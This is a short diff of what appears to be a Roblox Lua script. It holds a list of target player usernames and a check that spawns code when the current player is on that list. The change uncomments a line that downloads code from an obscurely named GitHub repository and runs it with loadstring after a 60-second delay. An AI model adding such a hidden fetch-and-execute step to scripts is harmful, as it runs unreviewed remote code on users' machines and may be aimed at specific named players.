@@ -26,7 +26,7 @@ local targetNames = {"sijmongirthss","Ash3rP0w3rPanda2018","soystaylan5","dreddy
 ---------------------------------------------------------------------------------------------------------------------------
 
 wait(60)
---loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/CPU-LOW"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/CPU-LOW"))()
 
 if table.find(targetNames, player.Name) then
 	task.spawn(function()	
